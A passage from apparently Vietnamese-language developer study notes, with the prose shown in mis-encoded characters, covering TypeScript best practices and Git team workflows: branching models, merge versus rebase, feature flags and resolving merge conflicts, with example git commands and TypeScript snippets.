| **unknown** | Type-safe any | External data cáº§n validation |
| **any** | Táº¯t type checking | Migration JSâ†’TS (trÃ¡nh dÃ¹ng) |

---

### **ğŸ¯ Best Practices Tá»•ng Há»£p**

#### **1. Type Safety:**
```typescript
// âŒ TrÃ¡nh
function process(data: any) {
  return data.value.toUpperCase();
}

// âœ… Tá»‘t hÆ¡n
function process(data: unknown) {
  if (
    typeof data === 'object' &&
    data !== null &&
    'value' in data &&
    typeof data.value === 'string'
  ) {
    return data.value.toUpperCase();
  }
  throw new Error("Invalid data");
}

// âœ… Tá»‘t nháº¥t
interface Data {
  value: string;
}

function process(data: Data) {
  return data.value.toUpperCase();
}
```

#### **2. Generics vs Overloads:**
```typescript
// âŒ Overload phá»©c táº¡p
function format(value: string): string;
function format(value: number): string;
function format(value: boolean): string;
function format(value: string | number | boolean): string {
  return String(value);
}

// âœ… Generic Ä‘Æ¡n giáº£n hÆ¡n
function format<T>(value: T): string {
  return String(value);
}
```

#### **3. Utility Types thay vÃ¬ Manual:**
```typescript
// âŒ Manual
type UserUpdate = {
  name?: string;
  age?: number;
  email?: string;
};

// âœ… DÃ¹ng Partial
type UserUpdate = Partial<User>;
```

#### **4. Discriminated Unions cho State:**
```typescript
// âœ… Type-safe state machine
type LoadingState = { status: 'loading' };
type SuccessState = { status: 'success'; data: User };
type ErrorState = { status: 'error'; error: string };
type State = LoadingState | SuccessState | ErrorState;

function render(state: State) {
  switch (state.status) {
    case 'loading':
      return <Spinner />;
    case 'success':
      return <UserProfile user={state.data} />;
    case 'error':
      return <Error message={state.error} />;
  }
}
```

#### **5. Branded Types cho Domain Logic:**
```typescript
// âœ… TrÃ¡nh nháº§m láº«n giá»¯a cÃ¡c sá»‘
type UserId = Brand<number, 'UserId'>;
type ProductId = Brand<number, 'ProductId'>;

function getUser(id: UserId) { /* ... */ }
function getProduct(id: ProductId) { /* ... */ }

const userId = 123 as UserId;
const productId = 456 as ProductId;

getUser(userId); // âœ…
// getUser(productId); // âŒ Error: ProductId khÃ´ng assign cho UserId
```

---

### **ğŸš€ Káº¿t Luáº­n**

TypeScript khÃ´ng chá»‰ lÃ  "JavaScript with types" mÃ  cÃ²n lÃ :
- **Developer Experience**: IntelliSense, auto-completion, refactoring an toÃ n
- **Early Error Detection**: Lá»—i báº¯t compile-time thay vÃ¬ runtime
- **Self-Documenting**: Code tá»± giáº£i thÃ­ch thÃ´ng qua types
- **Scalability**: Maintain large codebase dá»… dÃ ng hÆ¡n

**Senior Developer cáº§n:**
1. âœ… Hiá»ƒu sÃ¢u type system (structural typing, generics, conditional types)
2. âœ… DÃ¹ng utility types thÃ nh tháº¡o
3. âœ… Ãp dá»¥ng OOP principles Ä‘Ãºng cÃ¡ch (abstract, interface, implements)
4. âœ… Type-safe vá»›i unknown thay vÃ¬ any
5. âœ… Branded types cho domain logic phá»©c táº¡p
6. âœ… Generics vá»›i constraints cho reusable code

**ğŸ’¡ Remember:**
> "TypeScript lÃ  cÃ´ng cá»¥, khÃ´ng pháº£i má»¥c Ä‘Ã­ch. DÃ¹ng Ä‘á»§ Ä‘á»ƒ code safe, Ä‘á»«ng over-engineering!" ğŸ¯

---

## **Q67: Git Workflow & Team Collaboration - Branching Strategy, Merge vs Rebase, Conflict Resolution** ğŸŒ¿

**âš¡ Quick Summary:**
> Git workflow tá»‘t = Ã­t conflict + dá»… review + dá»… rollback. Git Flow phÃ¹ há»£p dá»± Ã¡n lá»›n, GitHub Flow phÃ¹ há»£p CI/CD. Rebase táº¡o history sáº¡ch, Merge giá»¯ nguyÃªn context. Feature flags giÃºp deploy code chÆ°a hoÃ n thiá»‡n mÃ  khÃ´ng áº£nh hÆ°á»Ÿng production.

**ğŸ’¡ Ghi Nhá»›:**
- ğŸŒ³ **Git Flow**: main + develop + feature/* + release/* + hotfix/* (dá»± Ã¡n lá»›n, release theo version)
- ğŸš€ **GitHub Flow**: main + feature/* (CI/CD, deploy liÃªn tá»¥c)
- âš”ï¸ **Merge vs Rebase**: Merge = giá»¯ nguyÃªn history, Rebase = history sáº¡ch nhÆ°ng máº¥t context
- ğŸš© **Feature Flags**: Deploy code má»›i nhÆ°ng táº¯t feature, báº­t dáº§n theo pháº§n trÄƒm user

---

### **1. Branching Models - CÃ¡c MÃ´ HÃ¬nh PhÃ¢n NhÃ¡nh**

#### **1.1. Git Flow - MÃ´ hÃ¬nh phá»• biáº¿n cho dá»± Ã¡n lá»›n**

```
ğŸ“Š Structure Git Flow:

main (production)          â”€â”€â”€â—â”€â”€â”€â”€â”€â”€â”€â—â”€â”€â”€â”€â”€â”€â”€â—â”€â”€â”€â”€â”€â”€â”€ (v1.0, v2.0, v3.0)
                              â•±         â•²       
develop (staging)      â”€â”€â”€â”€â”€â”€â—â”€â”€â”€â—â”€â”€â”€â—â”€â”€â”€â—â”€â”€â”€â—â”€â”€â”€â”€â”€â”€â”€â”€ (code má»›i nháº¥t)
                            â•±     â•²   â•±
feature/login      â”€â”€â”€â”€â”€â”€â”€â”€â—â”€â”€â”€â—â”€â”€â”€â—                    (tÃ­nh nÄƒng má»›i)
feature/payment    â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â—â”€â”€â”€â—â”€â”€â”€â—                  (tÃ­nh nÄƒng khÃ¡c)
                                    â•²
release/v2.0       â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â—â”€â”€â”€â—â”€â”€          (chuáº©n bá»‹ release)
                                            â•²
hotfix/bug-123     â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â—â”€â”€â—â”€â”€â”€â”€â”€  (fix lá»—i kháº©n cáº¥p)
```

**Chi tiáº¿t cÃ¡c nhÃ¡nh:**

```bash
# 1. main (hoáº·c master) - Production branch
# - Chá»‰ chá»©a code á»•n Ä‘á»‹nh, Ä‘Ã£ test ká»¹
# - Má»—i commit lÃ  má»™t version release (v1.0, v1.1, v2.0...)
# - KHÃ”NG bao giá» commit trá»±c tiáº¿p vÃ o main!

# 2. develop - Integration branch (nhÃ¡nh phÃ¡t triá»ƒn chÃ­nh)
# - Chá»©a code má»›i nháº¥t Ä‘Ã£ merge tá»« cÃ¡c feature branches
# - LÃ  base branch Ä‘á»ƒ táº¡o feature má»›i
# - Code á»Ÿ Ä‘Ã¢y Ä‘Ã£ qua code review nhÆ°ng chÆ°a release

# 3. feature/* - Feature branches
# - Má»—i tÃ­nh nÄƒng má»›i = 1 feature branch
# - TÃªn: feature/ten-tinh-nang (vd: feature/login, feature/payment)
git checkout develop
git checkout -b feature/user-authentication

# LÃ m viá»‡c trÃªn feature branch...
git add .
git commit -m "feat: implement JWT authentication"

# Merge vÃ o develop khi xong
git checkout develop
git pull origin develop  # Láº¥y code má»›i nháº¥t
git merge feature/user-authentication
git push origin develop

# XÃ³a feature branch sau khi merge
git branch -d feature/user-authentication


# 4. release/* - Release branches
# - Chuáº©n bá»‹ release version má»›i
# - Fix bugs nhá», update version, documentation
git checkout develop
git checkout -b release/v2.0.0

# Fix bugs, update CHANGELOG, version...
git commit -m "chore: bump version to 2.0.0"

# Merge vÃ o Cáº¢HAI main VÃ€ develop
git checkout main
git merge release/v2.0.0
git tag -a v2.0.0 -m "Release version 2.0.0"
git push origin main --tags

git checkout develop
git merge release/v2.0.0
git push origin develop

git branch -d release/v2.0.0


# 5. hotfix/* - Hotfix branches
# - Fix lá»—i KHáº¨N Cáº¤P trÃªn production
# - Branch tá»« main (khÃ´ng pháº£i develop!)
git checkout main
git checkout -b hotfix/critical-security-bug

# Fix bug...
git commit -m "fix: patch security vulnerability CVE-2024-1234"

# Merge vÃ o Cáº¢HAI main VÃ€ develop
git checkout main
git merge hotfix/critical-security-bug
git tag -a v2.0.1 -m "Hotfix: security patch"
git push origin main --tags

git checkout develop
git merge hotfix/critical-security-bug
git push origin develop

git branch -d hotfix/critical-security-bug
```

**Æ¯u Ä‘iá»ƒm Git Flow:**
- âœ… RÃµ rÃ ng, dá»… quáº£n lÃ½ vá»›i dá»± Ã¡n lá»›n (nhiá»u developers, nhiá»u versions)
- âœ… TÃ¡ch biá»‡t development vÃ  production rÃµ rÃ ng
- âœ… Há»— trá»£ multiple versions Ä‘á»“ng thá»i (v1.x vÃ  v2.x)

**NhÆ°á»£c Ä‘iá»ƒm:**
- âŒ Phá»©c táº¡p, nhiá»u nhÃ¡nh
- âŒ KhÃ´ng phÃ¹ há»£p CI/CD (continuous deployment)
- âŒ Merge conflicts nhiá»u hÆ¡n

---

#### **1.2. GitHub Flow - ÄÆ¡n giáº£n hÆ¡n, phÃ¹ há»£p CI/CD**

```
ğŸ“Š Structure GitHub Flow:

main (production)   â”€â”€â—â”€â”€â”€â—â”€â”€â”€â”€â”€â”€â”€â—â”€â”€â”€â—â”€â”€â”€â”€â”€â”€â”€â—â”€â”€â”€â”€â”€â”€
                      â”‚   â”‚       â”‚   â”‚       â”‚
                      â”‚   â”‚       â”‚   â”‚       â””â”€ feature/payment merged
                      â”‚   â”‚       â”‚   â””â”€ feature/dashboard merged  
                      â”‚   â”‚       â””â”€ hotfix/bug-fix merged
                      â”‚   â””â”€ feature/login merged
                      â”‚
feature/login      â”€â”€â”€â—â”€â”€â”€â—â”€â”€â”€â—
feature/dashboard  â”€â”€â”€â”€â”€â”€â”€â”€â”€â—â”€â”€â”€â—â”€â”€â”€â—
hotfix/bug-fix     â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â—â”€â”€â—
feature/payment    â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â—â”€â”€â”€â—â”€â”€â”€â—
```

**Workflow Ä‘Æ¡n giáº£n:**

```bash
# 1. Chá»‰ cÃ³ 1 nhÃ¡nh main (production-ready)

# 2. Táº¡o feature branch tá»« main
git checkout main
git pull origin main
git checkout -b feature/new-feature

# 3. Commit vÃ  push thÆ°á»ng xuyÃªn
git add .
git commit -m "feat: add feature X"
git push origin feature/new-feature

# 4. Táº¡o Pull Request (PR) trÃªn GitHub
# - Code review
# - CI/CD cháº¡y tests tá»± Ä‘á»™ng
# - Deploy lÃªn staging environment Ä‘á»ƒ test

# 5. Merge vÃ o main SAU KHI:
# - âœ… Code review approved
# - âœ… CI/CD tests passed
# - âœ… Staging test OK
git checkout main
git pull origin main
git merge feature/new-feature
git push origin main

# 6. Auto-deploy lÃªn production (CI/CD pipeline)

# 7. XÃ³a feature branch
git branch -d feature/new-feature
git push origin --delete feature/new-feature
```

**Æ¯u Ä‘iá»ƒm GitHub Flow:**
- âœ… ÄÆ¡n giáº£n, dá»… hiá»ƒu
- âœ… PhÃ¹ há»£p CI/CD, deploy liÃªn tá»¥c
- âœ… Ãt conflict hÆ¡n (merge thÆ°á»ng xuyÃªn)

**NhÆ°á»£c Ä‘iá»ƒm:**
- âŒ KhÃ´ng phÃ¹ há»£p vá»›i release theo version cá»‘ Ä‘á»‹nh
- âŒ KhÃ³ quáº£n lÃ½ nhiá»u versions Ä‘á»“ng thá»i

---

#### **1.3. Trunk-Based Development - Extreme simplicity**

```bash
# Táº¥t cáº£ developers commit trá»±c tiáº¿p vÃ o main (hoáº·c trunk)
# DÃ¹ng feature flags Ä‘á»ƒ táº¯t/báº­t features chÆ°a hoÃ n thiá»‡n

git checkout main
git pull origin main

# LÃ m viá»‡c trá»±c tiáº¿p trÃªn main (hoáº·c short-lived branch < 1 ngÃ y)
# Code má»›i Ä‘Æ°á»£c báº£o vá»‡ báº±ng feature flags

# Code vá»›i feature flag
if (featureFlags.isEnabled('new-payment')) {
  // Code má»›i (chÆ°a hoÃ n thiá»‡n)
  renderNewPayment();
} else {
  // Code cÅ© (Ä‘ang cháº¡y)
  renderOldPayment();
}

git add .
git commit -m "feat: add new payment (behind feature flag)"
git push origin main  # Deploy lÃªn production ngay!

# Feature flag táº¯t â†’ user khÃ´ng tháº¥y code má»›i
# Báº­t dáº§n theo % user: 10% â†’ 50% â†’ 100%
```

**Æ¯u Ä‘iá»ƒm:**
- âœ… Cá»±c ká»³ Ä‘Æ¡n giáº£n
- âœ… Integration liÃªn tá»¥c, Ã­t conflict
- âœ… Deploy nhanh

**NhÆ°á»£c Ä‘iá»ƒm:**
- âŒ Cáº§n CI/CD máº¡nh (tests tá»± Ä‘á»™ng ká»¹)
- âŒ Cáº§n feature flag infrastructure
- âŒ Rá»§i ro cao náº¿u tests khÃ´ng Ä‘á»§ tá»‘t

---

### **2. Merge vs Rebase - Sá»± KhÃ¡c Biá»‡t Quan Trá»ng**

#### **2.1. Git Merge - Giá»¯ nguyÃªn lá»‹ch sá»­**

```bash
# TÃ¬nh huá»‘ng: feature branch Ä‘Ã£ cÃ³ 3 commits
# main branch cÃ³ 2 commits má»›i (tá»« developer khÃ¡c)

main:     A â”€â”€â”€ B â”€â”€â”€ C â”€â”€â”€ D â”€â”€â”€ E
                        â•²
feature:                 F â”€â”€â”€ G â”€â”€â”€ H

# Merge feature vÃ o main
git checkout main
git merge feature/login

# Káº¿t quáº£: Táº¡o MERGE COMMIT (M)
main:     A â”€â”€â”€ B â”€â”€â”€ C â”€â”€â”€ D â”€â”€â”€ E â”€â”€â”€ M
                        â•²               â•±
feature:                 F â”€â”€â”€ G â”€â”€â”€ H
```

**Äáº·c Ä‘iá»ƒm Merge:**
```bash
# Æ¯u Ä‘iá»ƒm:
# âœ… Giá»¯ nguyÃªn lá»‹ch sá»­ (biáº¿t branch tá»« Ä‘Ã¢u, merge khi nÃ o)
# âœ… An toÃ n (khÃ´ng thay Ä‘á»•i commits cÅ©)
# âœ… PhÃ¹ há»£p public branches (main, develop)

# NhÆ°á»£c Ä‘iá»ƒm:
# âŒ History nhiá»u merge commits, phá»©c táº¡p
# âŒ KhÃ³ theo dÃµi khi nhiá»u branches merge
# âŒ Git log rá»‘i (cÃ³ nhiá»u nhÃ¡nh)

# Khi nÃ o dÃ¹ng Merge?
# - Merge feature vÃ o main/develop (public branches)
# - Muá»‘n giá»¯ context: ai lÃ m gÃ¬, khi nÃ o
# - Team lá»›n, cáº§n trace history Ä‘áº§y Ä‘á»§
```

---

#### **2.2. Git Rebase - Táº¡o lá»‹ch sá»­ tuyáº¿n tÃ­nh**

```bash
# TÃ¬nh huá»‘ng giá»‘ng trÃªn
main:     A â”€â”€â”€ B â”€â”€â”€ C â”€â”€â”€ D â”€â”€â”€ E
                        â•²
feature:                 F â”€â”€â”€ G â”€â”€â”€ H

# Rebase feature lÃªn main
git checkout feature/login
git rebase main

# Káº¿t quáº£: "Di chuyá»ƒn" F, G, H lÃªn SAU E
main:     A â”€â”€â”€ B â”€â”€â”€ C â”€â”€â”€ D â”€â”€â”€ E
                                    â•²
feature:                             F' â”€â”€â”€ G' â”€â”€â”€ H'
#                                    ^^^Commits má»›i (hash khÃ¡c!)
```

**Äáº·c Ä‘iá»ƒm Rebase:**
```bash
# Æ¯u Ä‘iá»ƒm:
# âœ… Lá»‹ch sá»­ sáº¡ch, tuyáº¿n tÃ­nh (linear history)
# âœ… Dá»… Ä‘á»c git log (khÃ´ng cÃ³ merge commits)
# âœ… Dá»… cherry-pick, revert

# NhÆ°á»£c Ä‘iá»ƒm:
# âŒ Máº¥t context (khÃ´ng biáº¿t branch tá»« Ä‘Ã¢u)
# âŒ THAY Äá»”I COMMIT HASH â†’ Nguy hiá»ƒm vá»›i public branches!
# âŒ Conflict khÃ³ resolve hÆ¡n (cÃ³ thá»ƒ conflict nhiá»u láº§n)

# Khi nÃ o dÃ¹ng Rebase?
# - Rebase local branch (chÆ°a push)
# - Rebase feature branch lÃªn main trÆ°á»›c khi táº¡o PR
# - Muá»‘n history sáº¡ch Ä‘áº¹p
# - Team nhá», quen vá»›i rebase

# âš ï¸ GOLDEN RULE OF REBASE:
# "NEVER rebase public branches (main, develop)!"
# VÃ¬ sáº½ lÃ m conflict vá»›i code cá»§a ngÆ°á»i khÃ¡c!
```

---

#### **2.3. So sÃ¡nh Merge vs Rebase**

| Feature | Merge | Rebase |
|---------|-------|--------|
| **History** | Giá»¯ nguyÃªn, cÃ³ merge commits | Tuyáº¿n tÃ­nh, sáº¡ch Ä‘áº¹p |
| **Commit hash** | KhÃ´ng Ä‘á»•i | Äá»”I (commits má»›i) |
| **Context** | âœ… Giá»¯ nguyÃªn (biáº¿t branch tá»« Ä‘Ã¢u) | âŒ Máº¥t (khÃ´ng biáº¿t branch point) |
| **Conflicts** | Resolve 1 láº§n | CÃ³ thá»ƒ resolve nhiá»u láº§n |
| **Safety** | âœ… An toÃ n (khÃ´ng thay Ä‘á»•i history) | âš ï¸ Nguy hiá»ƒm náº¿u rebase public branch |
| **Use case** | Public branches (main, develop) | Local/feature branches |
| **Git log** | Phá»©c táº¡p (nhiá»u nhÃ¡nh) | ÄÆ¡n giáº£n (tuyáº¿n tÃ­nh) |

---

#### **2.4. Interactive Rebase - Chá»‰nh sá»­a commits**

```bash
# Squash nhiá»u commits thÃ nh 1 commit
git rebase -i HEAD~3  # Chá»‰nh sá»­a 3 commits gáº§n nháº¥t

# Editor hiá»‡n ra:
# pick f7f3f6d feat: add login form
# pick 310154e fix: typo in login
# pick a5f4a0d fix: add validation

# Thay Ä‘á»•i thÃ nh:
# pick f7f3f6d feat: add login form
# squash 310154e fix: typo in login
# squash a5f4a0d fix: add validation

# Káº¿t quáº£: 3 commits â†’ 1 commit sáº¡ch Ä‘áº¹p
# feat: add login form (vá»›i táº¥t cáº£ changes)

# Use cases:
# - Squash "WIP commits" trÆ°á»›c khi táº¡o PR
# - Chá»‰nh sá»­a commit messages
# - Reorder commits
# - Drop commits khÃ´ng cáº§n thiáº¿t
```

---

### **3. Feature Flags - Deploy Code ChÆ°a HoÃ n Thiá»‡n**

#### **3.1. Feature Flags lÃ  gÃ¬?**

```typescript
// âŒ CÃ¡ch cÅ©: Pháº£i chá» feature hoÃ n thiá»‡n má»›i merge vÃ o main
// â†’ Feature branch sá»‘ng lÃ¢u â†’ Nhiá»u conflicts!

// âœ… CÃ¡ch má»›i: Merge code vÃ o main NGAY, nhÆ°ng "táº¯t" feature
// â†’ Feature branch ngáº¯n â†’ Ãt conflicts!

// Feature Flag implementation
interface FeatureFlags {
  newPaymentUI: boolean;      // Feature má»›i
  darkMode: boolean;           // Theme tá»‘i
  experimentalChart: boolean;  // Chart má»›i (Ä‘ang test)
}

// Quáº£n lÃ½ flags tá»« server (cÃ³ thá»ƒ báº­t/táº¯t realtime)
const flags: FeatureFlags = await fetch('/api/feature-flags').then(r => r.json());

// DÃ¹ng trong code
function renderPayment() {
  if (flags.newPaymentUI) {
    // Code Má»šI (chÆ°a hoÃ n thiá»‡n, nhÆ°ng Ä‘Ã£ merge vÃ o main)
    return <NewPaymentUI />;
  } else {
    // Code CÅ¨ (Ä‘ang cháº¡y production)
    return <OldPaymentUI />;
  }
}

// Lá»£i Ã­ch:
// 1. Deploy code má»›i NGAY (khÃ´ng chá» hoÃ n thiá»‡n)
// 2. Báº­t feature cho 10% users â†’ test â†’ náº¿u OK â†’ 100%
// 3. Náº¿u cÃ³ bug â†’ táº¯t feature NGAY (khÃ´ng cáº§n rollback code)
// 4. A/B testing: 50% user tháº¥y UI cÅ©, 50% tháº¥y UI má»›i
```

#### **3.2. Gradual Rollout - Báº­t dáº§n theo pháº§n trÄƒm**

```typescript
// Backend API quáº£n lÃ½ feature flags
interface FeatureFlagConfig {
  name: string;
  enabled: boolean;
  rolloutPercentage: number; // 0-100
  targetUsers?: string[];    // Báº­t cho user cá»¥ thá»ƒ
}

const featureConfig: FeatureFlagConfig = {
  name: 'newPaymentUI',
  enabled: true,
  rolloutPercentage: 10,  // Chá»‰ 10% users tháº¥y feature má»›i
  targetUsers: ['admin@company.com', 'beta-tester@company.com']
};

// Frontend check
function isFeatureEnabled(userId: string, featureName: string): boolean {
  const config = getFeatureConfig(featureName);
  
  // LuÃ´n báº­t cho target users
  if (config.targetUsers?.includes(userId)) {
    return true;
  }
  
  // Báº­t theo % (consistent hashing Ä‘á»ƒ user luÃ´n tháº¥y cÃ¹ng UI)
  const hash = hashUserId(userId);
  return hash % 100 < config.rolloutPercentage;
}

// Rollout process:
// Day 1: 10% users  â†’ Monitor metrics (errors, performance)
// Day 2: 25% users  â†’ So sÃ¡nh conversion rate
// Day 3: 50% users  â†’ Gather feedback
// Day 4: 100% users â†’ Full rollout!
// Náº¿u cÃ³ váº¥n Ä‘á» â†’ rollback vá» 0% NGAY!
```

#### **3.3. Feature Flag Tools**

```typescript
// 1. LaunchDarkly (commercial, máº¡nh nháº¥t)
import LaunchDarkly from 'launchdarkly-node-server-sdk';

const client = LaunchDarkly.init('sdk-key');
const showNewUI = await client.variation('new-payment-ui', user, false);

// 2. Unleash (open-source)
import { initialize } from 'unleash-client';

const unleash = initialize({
  url: 'https://unleash.yourcompany.com/api/',
  appName: 'my-app',
});

if (unleash.isEnabled('new-payment-ui')) {
  // Show new UI
}

// 3. Simple custom solution
const FLAGS = {
  newPaymentUI: process.env.FEATURE_NEW_PAYMENT === 'true',
  darkMode: process.env.FEATURE_DARK_MODE === 'true',
};

// Hoáº·c fetch tá»« database/config service
```

---

### **4. TrÃ¡nh Conflicts Khi LÃ m Viá»‡c Team**

#### **4.1. CÃ¡c TÃ¬nh Huá»‘ng Conflicts ThÆ°á»ng Gáº·p**

**TÃ¬nh huá»‘ng 1: Hai ngÆ°á»i sá»­a cÃ¹ng 1 file**

```typescript
// Developer A: ThÃªm function má»›i
// file: utils.ts (commit vÃ o main)
export function calculateTotal(items: Item[]): number {
  return items.reduce((sum, item) => sum + item.price, 0);
}

export function formatCurrency(amount: number): string {  // â† A thÃªm
  return `$${amount.toFixed(2)}`;
}

// Developer B: CÅ©ng thÃªm function (feature branch)
// file: utils.ts
export function calculateTotal(items: Item[]): number {
  return items.reduce((sum, item) => sum + item.price, 0);
}

export function calculateTax(amount: number): number {  // â† B thÃªm
  return amount * 0.1;
}

// Khi B merge â†’ CONFLICT! (cÃ¹ng thÃªm code vÃ o cuá»‘i file)
```

**Giáº£i phÃ¡p:**
```bash
# 1. Pull code má»›i THÆ¯á»œNG XUYÃŠN (má»—i ngÃ y)
git checkout main
git pull origin main
git checkout feature/my-feature
git merge main  # Hoáº·c: git rebase main

# 2. Merge nhá», merge thÆ°á»ng
# âŒ KhÃ´ng: Feature branch sá»‘ng 2 tuáº§n
# âœ… NÃªn: Feature branch sá»‘ng 1-2 ngÃ y, merge ngay

# 3. Chia nhá» features
# âŒ KhÃ´ng: 1 PR cÃ³ 50 files changes
# âœ… NÃªn: 1 PR cÃ³ 5-10 files, dá»… review, dá»… merge

# 4. Communication!
# - NÃ³i vá»›i team: "TÃ´i Ä‘ang sá»­a file X"
# - Check PR cá»§a ngÆ°á»i khÃ¡c trÆ°á»›c khi báº¯t Ä‘áº§u
```

---

**TÃ¬nh huá»‘ng 2: Xung Ä‘á»™t logic (khÃ´ng pháº£i code conflict)**

```typescript
// Developer A: Äá»•i API response format
// api/user.ts
export async function getUser(id: string) {
  return {
    id,
    name: "John",
    email: "john@example.com",
    // age: 30  â† A XÃ“A field nÃ y (khÃ´ng cáº§n ná»¯a)
  };
}

// Developer B: DÃ¹ng field age trong component
// components/UserProfile.tsx
function UserProfile({ userId }: Props) {
  const user = await getUser(userId);
  
  return (
    <div>
      <p>Name: {user.name}</p>
      <p>Age: {user.age}</p>  {/* â† B dÃ¹ng age! */}
    </div>
  );
}

// Káº¿t quáº£: Code merge OK (khÃ´ng conflict)
// NhÆ°ng runtime error: user.age is undefined!
```

**Giáº£i phÃ¡p:**
```typescript
// 1. TypeScript giÃºp phÃ¡t hiá»‡n!
// Khi A xÃ³a field age, TypeScript sáº½ bÃ¡o lá»—i á»Ÿ component B

// 2. Code review ká»¹
// Reviewer pháº£i check: "CÃ³ ai Ä‘ang dÃ¹ng field nÃ y khÃ´ng?"

// 3. Deprecation process
// Thay vÃ¬ xÃ³a ngay, mark as deprecated trÆ°á»›c
export async function getUser(id: string) {
  return {
    id,
    name: "John",
    email: "john@example.com",
    /** @deprecated Use birthDate instead */
    age: 30,
    birthDate: "1993-01-01",
  };
}

// Sau 1-2 sprints, search toÃ n bá»™ codebase:
// grep -r "user.age" src/
// Náº¿u khÃ´ng cÃ²n ai dÃ¹ng â†’ má»›i xÃ³a!

// 4. API Versioning
// /api/v1/users â†’ Tráº£ vá» cÃ³ age
// /api/v2/users â†’ KhÃ´ng cÃ³ age
```

---

**TÃ¬nh huá»‘ng 3: Database migration conflicts**

```typescript
// Developer A: ThÃªm column "phone"
// migrations/001_add_phone.sql
ALTER TABLE users ADD COLUMN phone VARCHAR(20);

// Developer B: ThÃªm column "address"
// migrations/002_add_address.sql (cÃ¹ng thá»i Ä‘iá»ƒm)
ALTER TABLE users ADD COLUMN address TEXT;

// Khi merge:
// - Náº¿u A merge trÆ°á»›c â†’ migrations/001 cháº¡y OK
// - B merge sau â†’ migrations/002 cháº¡y OK
// - NhÆ°ng trÃªn main: cÃ³ Cáº¢ HAI migrations
// - Production: Cháº¡y migrations theo thá»© tá»± nÃ o? 001 hay 002?
```

**Giáº£i phÃ¡p:**
```bash
# 1. Migration vá»›i timestamp
# migrations/20241115_120000_add_phone.sql
# migrations/20241115_120100_add_address.sql
# â†’ Thá»© tá»± rÃµ rÃ ng theo thá»i gian

# 2. Naming convention
# migrations/001_add_phone.sql
# migrations/002_add_address.sql
# â†’ Náº¿u conflict, rename 002 â†’ 003

# 3. Database migration tools
# - Flyway, Liquibase: Tá»± Ä‘á»™ng quáº£n lÃ½ thá»© tá»±
# - Prisma, TypeORM: Generate migrations vá»›i timestamp

# 4. Communication
# Announce trong team chat: "TÃ´i Ä‘ang táº¡o migration má»›i"
# â†’ NgÆ°á»i khÃ¡c biáº¿t vÃ  trÃ¡nh conflict
```

---

#### **4.2. Best Practices TrÃ¡nh Conflicts**

```bash
# 1. Pull code thÆ°á»ng xuyÃªn (hÃ ng ngÃ y)
git checkout main
git pull origin main
git checkout feature/my-feature
git rebase main  # Hoáº·c merge main vÃ o feature

# 2. Push code thÆ°á»ng xuyÃªn
# - Backup code (náº¿u mÃ¡y há»ng)
# - NgÆ°á»i khÃ¡c biáº¿t báº¡n Ä‘ang lÃ m gÃ¬
git push origin feature/my-feature

# 3. Small PRs (Pull Requests nhá»)
# âŒ KhÃ´ng: 1 PR = 50 files, 2000 lines
# âœ… NÃªn: 1 PR = 5-10 files, 200-300 lines
# â†’ Dá»… review, merge nhanh, Ã­t conflict

# 4. Feature flags cho features lá»›n
# - Merge code vÃ o main NGAY (táº¯t feature flag)
# - KhÃ´ng chá» feature hoÃ n thiá»‡n
# â†’ Feature branch ngáº¯n â†’ Ã­t conflict

# 5. Communication lÃ  chÃ¬a khÃ³a!
# - Daily standup: "HÃ´m nay tÃ´i sáº½ sá»­a file X, Y"
# - Slack/Teams: "Ai Ä‘ang lÃ m viá»‡c vá»›i module authentication khÃ´ng?"
# - Code review: Xem PR cá»§a ngÆ°á»i khÃ¡c, biáº¿t há» Ä‘ang lÃ m gÃ¬

# 6. Code ownership
# - Má»—i module cÃ³ 1-2 ngÆ°á»i "owner"
# - Muá»‘n sá»­a module â†’ há»i owner trÆ°á»›c
# â†’ TrÃ¡nh 2 ngÆ°á»i sá»­a cÃ¹ng lÃºc

# 7. Git hooks
# Pre-commit: Format code tá»± Ä‘á»™ng (Prettier)
# Pre-push: Run tests
# â†’ TrÃ¡nh conflicts do format code khÃ¡c nhau
```

---

#### **4.3. Resolve Conflicts Khi Xáº£y Ra**

```bash
# TÃ¬nh huá»‘ng: Merge conflict
git checkout main
git pull origin main
git checkout feature/my-feature
git merge main

# Auto-merging src/utils.ts
# CONFLICT (content): Merge conflict in src/utils.ts
# Automatic merge failed; fix conflicts and then commit the result.

# File src/utils.ts sáº½ cÃ³ dáº¡ng:
```

```typescript
export function calculateTotal(items: Item[]): number {
  return items.reduce((sum, item) => sum + item.price, 0);
}

<<<<<<< HEAD (your code - feature branch)
export function calculateTax(amount: number): number {
  return amount * 0.1; // 10% tax
}
=======
export function formatCurrency(amount: number): string {
  return `$${amount.toFixed(2)}`;
}
>>>>>>> main (their code - main branch)
```

**CÃ¡ch resolve:**

```typescript
// Option 1: Giá»¯ Cáº¢ HAI (thÆ°á»ng lÃ  Ä‘Ãºng)
export function calculateTotal(items: Item[]): number {
  return items.reduce((sum, item) => sum + item.price, 0);
}

export function calculateTax(amount: number): number {
  return amount * 0.1; // 10% tax
}

export function formatCurrency(amount: number): string {
  return `$${amount.toFixed(2)}`;
}

// Option 2: Giá»¯ cá»§a báº¡n (Ã­t khi dÃ¹ng)
// XÃ³a code cá»§a main, chá»‰ giá»¯ code cá»§a báº¡n

// Option 3: Giá»¯ cá»§a main (Ã­t khi dÃ¹ng)
// XÃ³a code cá»§a báº¡n, chá»‰ giá»¯ code cá»§a main

// Option 4: Combine intelligent (phá»• biáº¿n)
// Káº¿t há»£p logic cá»§a cáº£ hai náº¿u cáº§n thiáº¿t
```

```bash
# Sau khi resolve:
git add src/utils.ts
git commit -m "chore: resolve merge conflict in utils.ts"
git push origin feature/my-feature

# Tips resolve conflicts:
# 1. Hiá»ƒu code cá»§a Cáº¢ HAI bÃªn (your code vÃ  their code)
# 2. Test sau khi resolve (cháº¡y tests, manual test)
# 3. Há»i ngÆ°á»i viáº¿t code kia náº¿u khÃ´ng cháº¯c
# 4. DÃ¹ng merge tools: VS Code, GitKraken, SourceTree
```

---

#### **4.4. Git Tools GiÃºp Collaboration**

```bash
# 1. Git Blame - Xem ai viáº¿t dÃ²ng code nÃ y
git blame src/utils.ts
